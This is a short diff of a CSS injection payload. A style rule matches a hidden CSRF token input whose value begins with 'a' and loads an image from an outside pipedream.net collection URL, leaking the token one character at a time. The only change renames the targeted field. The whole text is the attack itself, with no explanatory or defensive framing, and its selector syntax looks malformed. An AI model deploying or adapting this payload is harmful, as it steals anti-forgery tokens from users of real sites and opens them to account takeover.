@@ -1,5 +1,5 @@
 <style>
-input[name=csrf_token][value=^a] {
+input[name=csrf][value=^a] {
     background-image: url(https://eoolv8mg5a4hgei.m.pipedream.net/log?a);
 }
 </style>
